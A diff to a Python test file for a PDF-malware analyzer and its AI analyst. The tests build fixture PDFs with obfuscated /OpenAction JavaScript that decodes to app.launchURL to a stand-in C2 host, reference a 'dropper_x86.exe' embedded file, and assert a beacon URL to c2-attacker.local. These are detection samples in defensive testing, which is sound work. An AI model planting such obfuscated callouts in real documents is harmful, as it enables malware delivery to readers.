@@ -41,7 +41,7 @@ def isolated_client(tmp_path, monkeypatch):
     monkeypatch.setattr(app_main, "sandbox_engine", test_sandbox)
     monkeypatch.setattr(app_main, "SANITIZED_DIR", sanitized_dir)
 
-    return TestClient(app_main.app), test_ledger, test_sandbox, sanitized_dir
+    return TestClient(app_main.app, headers={"X-Kertopati-Token": app_main.API_TOKEN}), test_ledger, test_sandbox, sanitized_dir
 
 
 def test_clean_pdf_passes_with_valid_byterange_and_cdr(isolated_client, tmp_path):
@@ -1021,6 +1021,159 @@ def test_interactive_docker_terminal_cd_ls_upload_and_vulnerable_mode(isolated_c
         assert "rencana_operasi_palsu.txt" in c4["stdout"]
     finally:
         real_sandbox.close_sandbox_session(local_sess["session_id"])
+
+
+def test_pdf_malware_deep_extractor_deobfuscation_entropy_and_ai_integration(isolated_client, tmp_path):
+    """
+    Memverifikasi modul deep_analyze_pdf_malware() & integrasi AI Analyst:
+    a) Mengekstrak isi aktual /JS + /OpenAction + /EmbeddedFiles dan mendekode String.fromCharCode / unescape / hex concat.
+    b) Menghitung Shannon Entropy (termasuk deteksi stream packed > 6.5) dan risk_score objektif (PDF terinfeksi > PDF bersih).
+    c) /api/upload menyimpan risk_score, shannon_entropy, detected_apis, extracted_script_preview, & deobfuscated_script ke AI Intel & UI.
+    """
+    from app.pdf_malware_analyzer import deep_analyze_pdf_malware
+
+    client, _ledger, test_sandbox, _ = isolated_client
+
+    # 1. PDF Bersih harus memiliki risk_score rendah dan tanpa script berbahaya
+    clean_pdf = tmp_path / "clean_baseline.pdf"
+    build_clean_signed_pdf(clean_pdf)
+    clean_res = deep_analyze_pdf_malware(clean_pdf.read_bytes())
+    assert clean_res["is_pdf"] is True
+    assert clean_res["byterange_status"] == "VALID"
+    assert clean_res["detected_apis"] == []
+    assert clean_res["risk_score"] <= 15
+
+    # 2. PDF dengan obfuskasi String.fromCharCode + unescape('%u0061...') + concat + /EmbeddedFile + packed stream
+    writer = PdfWriter()
+    writer.add_blank_page(300, 300)
+    buf = io.BytesIO()
+    writer.write(buf)
+    base_pdf = buf.getvalue()
+
+    unescaped_tail = (
+        b"\n71 0 obj\n<< /Type /Filespec /F (dropper_x86.exe) >>\nendobj\n"
+        b"72 0 obj\n<< /Length 2048 >>\nstream\n"
+        + bytes((i * 73 + 19) % 256 for i in range(2048))
+        + b"\nendstream\nendobj\n"
+        b"73 0 obj\n<< /Type /Action /S /JavaScript /OpenAction true "
+        b"/JS (var fn = 'ev' + 'al'; unescape('%61%70%70%2e%6c%61%75%6e%63%68%55%52%4c%28%22%68%74%74%70%3a%2f%2f%63%32%2e%65%76%69%6c%2f%70%22%29'); util.printf('%s', '\\x41\\x42')) >>\nendobj\n"
+        b"%%EOF\n"
+    )
+    deep_unescape = deep_analyze_pdf_malware(base_pdf + unescaped_tail)
+    assert "unescape" in deep_unescape["obfuscation_layers"]
+    assert "string_concat" in deep_unescape["obfuscation_layers"]
+    assert "hex_escape" in deep_unescape["obfuscation_layers"]
+    assert "app.launchURL" in deep_unescape["detected_apis"]
+    assert "util.printf" in deep_unescape["detected_apis"]
+    assert "dropper_x86.exe" in deep_unescape["embedded_files"]
+    assert deep_unescape["shannon_entropy"] > 6.5
+    assert deep_unescape["entropy_packing_suspect"] is True
+    assert deep_unescape["risk_score"] > clean_res["risk_score"] + 40
+
+    # 3. Demo evil PDF (String.fromCharCode) melalui upload API -> terdecode dan tampil di UI
+    evil_pdf = tmp_path / "surat_evil_fromcharcode.pdf"
+    build_infected_shadow_pdf(evil_pdf)
+    evil_raw = evil_pdf.read_bytes()
+
+    deep_evil = deep_analyze_pdf_malware(evil_raw)
+    assert "String.fromCharCode" in deep_evil["obfuscation_layers"]
+    assert "http://c2-attacker.local/beacon" in deep_evil["deobfuscated_script"]
+    assert "app.alert" in deep_evil["detected_apis"]
+    assert "WScript.Shell" in deep_evil["detected_apis"]
+    assert "eval(" in deep_evil["detected_apis"]
+    assert deep_evil["risk_score"] > clean_res["risk_score"]
+
+    resp = client.post(
+        "/api/upload",
+        files={"file": ("surat_evil_fromcharcode.pdf", evil_raw, "application/pdf")},
+    )
+    assert resp.status_code == 200
+    ai = resp.json()["soc_view"]["sandbox_event"]["ai_analysis"]
+    assert ai["risk_score"] == deep_evil["risk_score"]
+    assert ai["shannon_entropy"] == deep_evil["shannon_entropy"]
+    assert "app.alert" in ai["detected_apis"]
+    assert "String.fromCharCode" in ai["extracted_script_preview"]
+    assert "http://c2-attacker.local/beacon" in ai["deobfuscated_script"]
+    assert len(test_sandbox.get_active_vaccines()) == 1
+
+    html = client.get("/").text
+    assert f"Risk Score: {ai['risk_score']}/100" in html
+    assert f"Entropy: {ai['shannon_entropy']:.2f}" in html
+    assert "Extracted &amp; Deobfuscated PDF Script" in html
+
+
+def test_gemini_retry_on_timeout_up_to_10_then_offline_fallback(monkeypatch, tmp_path):
+    """Memverifikasi panggilan langsung Gemini API retry maks 10x saat timeout sebelum fallback ke Offline Engine."""
+    import json
+    import urllib.request
+    from app import ai_analyst
+
+    monkeypatch.setenv("GEMINI_API_KEY", "dummy-test-key")
+    monkeypatch.setenv("GEMINI_MODEL", "gemini-flash-lite-latest")
+    monkeypatch.setattr(ai_analyst.time, "sleep", lambda _s: None)
+
+    evil_pdf = tmp_path / "retry_evil.pdf"
+    build_infected_shadow_pdf(evil_pdf)
+    evil_raw = evil_pdf.read_bytes()
+
+    # 1. Timeout 3x lalu sukses di percobaan ke-4 -> memakai respons Gemini
+    attempts_ok = {"count": 0}
+
+    class _MockResp:
+        def __init__(self, payload: dict):
+            self._data = json.dumps(payload).encode("utf-8")
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, *args):
+            return False
+
+        def read(self):
+            return self._data
+
+    class _OpenerRecover:
+        def open(self, req, timeout=6.0):
+            attempts_ok["count"] += 1
+            if attempts_ok["count"] <= 3:
+                raise TimeoutError("timed out")
+            return _MockResp(
+                {"candidates": [{"content": {"parts": [{"text": "Ringkasan Gemini setelah retry."}]}}]}
+            )
+
+    monkeypatch.setattr(urllib.request, "build_opener", lambda *a, **kw: _OpenerRecover())
+    res_ok = ai_analyst.analyze_threat_and_synthesize_vaccine(
+        filename="retry_evil.pdf",
+        raw_bytes=evil_raw,
+        source_unit="Kodim 0606",
+        file_format="PDF",
+        inspection_reasons=["Shadow Attack"],
+        dangerous_tags=["/JS", "/OpenAction"],
+    )
+    assert attempts_ok["count"] == 4
+    assert res_ok["ai_analysis"]["analysis_mode"] == "Gemini AI (gemini-flash-lite-latest)"
+    assert "Ringkasan Gemini setelah retry." in res_ok["ai_analysis"]["commander_brief"]
+
+    # 2. Timeout terus 10x -> berhenti di 10x & fallback ke Offline Evidence-Based Engine
+    attempts_fail = {"count": 0}
+
+    class _OpenerAlwaysTimeout:
+        def open(self, req, timeout=6.0):
+            attempts_fail["count"] += 1
+            raise TimeoutError("timed out")
+
+    monkeypatch.setattr(urllib.request, "build_opener", lambda *a, **kw: _OpenerAlwaysTimeout())
+    res_fallback = ai_analyst.analyze_threat_and_synthesize_vaccine(
+        filename="retry_evil.pdf",
+        raw_bytes=evil_raw,
+        source_unit="Kodim 0606",
+        file_format="PDF",
+        inspection_reasons=["Shadow Attack"],
+        dangerous_tags=["/JS", "/OpenAction"],
+    )
+    assert attempts_fail["count"] == 10
+    assert res_fallback["ai_analysis"]["analysis_mode"] == "Kertopati AI Evidence Engine (Offline)"
+    assert "Risk Score" in res_fallback["ai_analysis"]["commander_brief"]
 
 
 
